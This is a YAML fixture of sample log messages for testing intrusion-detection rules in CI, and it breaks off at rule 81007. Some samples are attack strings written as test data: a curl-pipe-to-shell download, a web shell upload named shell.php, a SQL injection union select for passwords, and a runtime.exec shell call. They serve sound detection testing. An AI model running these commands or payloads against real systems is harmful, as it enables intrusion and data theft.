# Rule sample corpus. Every enabled rule with a match expression must appear
# here with at least one positive and one negative sample; boundary samples
# pin near-miss behaviour so a broadened regex is caught in CI.
#
# Samples are evaluation fixtures, not production data.
samples:
  - rule_id: 81001
    positive:
      - message: "Failed password for root from 10.0.0.5 port 52222 ssh2"
    negative:
      - message: "Accepted publickey for deploy from 10.0.0.5 port 52222 ssh2"
    boundary:
      - text: "authentication failure; logname= uid=0"
        want: true
        note: "alternation member"
      - text: "brute force protection is enabled"
        want: true
        note: "alternation member"
      - text: "user authentication ok"
        want: false
        note: "near miss must not fire"

  - rule_id: 81003
    positive:
      - message: "GET /wp-admin/setup.php HTTP/1.1"
    negative:
      - message: "GET /index.html HTTP/1.1"
    boundary:
      - text: "GET /Admin/ HTTP/1.1"
        want: false
        note: "matching is case sensitive"
      - text: "GET /administrator/ HTTP/1.1"
        want: true
        note: "/admin is a prefix match, documented behaviour"

  - rule_id: 81002
    positive:
      - message: "POST /upload multipart/form-data; filename=shell.php HTTP/1.1"
    negative:
      - message: "POST /upload multipart/form-data; filename=report.pdf HTTP/1.1"
    boundary:
      - text: "filename=payload.jsp content-type=multipart/form-data"
        want: false
        note: "upload marker must precede the extension"
      - text: "GET /upload/help.html HTTP/1.1"
        want: false
        note: "no upload marker"

  - rule_id: 81004
    positive:
      - message: "process_start cmd=curl http://10.0.0.9/x.sh | sh"
    negative:
      - message: "process_start cmd=/usr/sbin/nginx -g daemon off;"
    boundary:
      - text: "suspicious_process base64 -d payload"
        want: true
        note: "second alternation branch"

  - rule_id: 81005
    positive:
      - message: "sqli detected in login form parameter user"
    negative:
      - message: "login form validation failed"
    boundary:
      - text: "select * from users where id=1 union select password from users"
        want: true
        note: "raw SQL text"
      - text: "the union representative called"
        want: false
        note: "no SQL marker"

  - rule_id: 81006
    positive:
      - message: "runtime.exec /bin/sh -c id"
    negative:
      - message: "java.lang.Runtime initialized"
    boundary:
      - text: "processbuilder started"
        want: true
        note: "class name signal"

  - rule_id: 81007
    positive:
